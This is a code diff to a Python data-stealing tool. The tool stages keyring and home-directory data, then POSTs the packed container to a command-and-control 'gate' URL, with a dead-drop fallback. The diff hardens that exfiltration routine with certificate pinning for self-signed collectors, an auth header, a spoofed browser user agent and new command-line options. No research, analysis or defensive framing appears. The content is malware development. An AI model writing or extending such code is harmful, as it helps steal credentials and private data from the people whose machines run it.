@@ -26,18 +26,23 @@ import ctypes.util
 import getpass
 import hashlib
 import hmac
+import http.client
 import json
 import os
 import platform as pyplatform
 import socket
+import ssl
 import subprocess
 import sys
 import time
-import urllib.request
+from urllib.parse import urlparse
 
 CFG = {
     "c2": "http://127.0.0.1:8443/gate",
     "psk": "dev-psk-change-me",
+    "pin": "",   # "" = verify against system CAs; "cert:HEX" = pin the exact
+                 # server cert sha256 (self-signed collectors); "any" = debug
+    "auth": "",  # X-SH-Auth header value when the collector runs --auth
     "ua": "Mozilla/5.0 (X11; Linux x86_64)",
 }
 
@@ -346,15 +351,45 @@ def stage_keyring(parts, home):
 
 
 # ---------------------------------------------------------------- exfil
-def post(blob, url, ua):
-    req = urllib.request.Request(url, data=blob, method="POST")
-    req.add_header("Content-Type", "application/octet-stream")
-    req.add_header("User-Agent", ua)
+def post(blob, url, ua, pin="", auth=""):
+    """POST the container. TLS policy: '' verify against system CAs,
+    'cert:HEX' pin the exact server cert sha256, 'any' debug no-verify."""
+    u = urlparse(url)
+    pin = (pin or "").strip().lower()
+    if u.scheme == "https":
+        ctx = ssl.create_default_context()
+        if pin == "any" or pin.startswith("cert:"):
+            ctx.check_hostname = False
+            ctx.verify_mode = ssl.CERT_NONE
+        conn = http.client.HTTPSConnection(u.hostname, u.port or 443,
+                                           timeout=30, context=ctx)
+    else:
+        conn = http.client.HTTPConnection(u.hostname, u.port or 80, timeout=30)
+
+    headers = {"Content-Type": "application/octet-stream", "User-Agent": ua}
+    if auth:
+        headers["X-SH-Auth"] = auth
     try:
-        with urllib.request.urlopen(req, timeout=30) as r:
-            return r.status == 200
+        conn.request("POST", u.path or "/gate", body=blob, headers=headers)
+        # enforce the pin after the handshake, before reading anything
+        if u.scheme == "https" and pin.startswith("cert:"):
+            der = conn.sock.getpeercert(binary_form=True) if conn.sock else None
+            got = hashlib.sha256(der).hexdigest() if der else ""
+            want = pin[5:].replace(":", "").replace("-", "")
+            if got != want:
+                log("tls pin MISMATCH (got %s..)", got[:8])
+                conn.close()
+                return False
+            log("tls pin MATCH")
+        resp = conn.getresponse()
+        resp.read()
+        return resp.status == 200
     except Exception as e:
         log("exfil failed: %s", e)
+        try:
+            conn.close()
+        except Exception:
+            pass
         return False
 
 
@@ -396,6 +431,10 @@ def main():
     ap = argparse.ArgumentParser()
     ap.add_argument("--c2", default=os.environ.get("SH_C2", CFG["c2"]))
     ap.add_argument("--psk", default=os.environ.get("SH_PSK", CFG["psk"]))
+    ap.add_argument("--pin", default=os.environ.get("SH_PIN", CFG["pin"]),
+                    help="'' verify (default), 'cert:HEX' pin cert sha256, 'any' debug")
+    ap.add_argument("--auth", default=os.environ.get("SH_AUTH", CFG["auth"]),
+                    help="X-SH-Auth header value for collector --auth")
     ap.add_argument("--out", default=None)
     ap.add_argument("--only", default=None)
     ap.add_argument("--home", default=os.path.expanduser("~"))
@@ -439,7 +478,7 @@ def main():
             f.write(blob)
         log("container written to %s", args.out)
         return 0
-    if post(blob, args.c2, CFG["ua"]):
+    if post(blob, args.c2, CFG["ua"], args.pin, args.auth):
         log("exfil: HTTP 200")
         return 0
     # dead drop for later retrieval
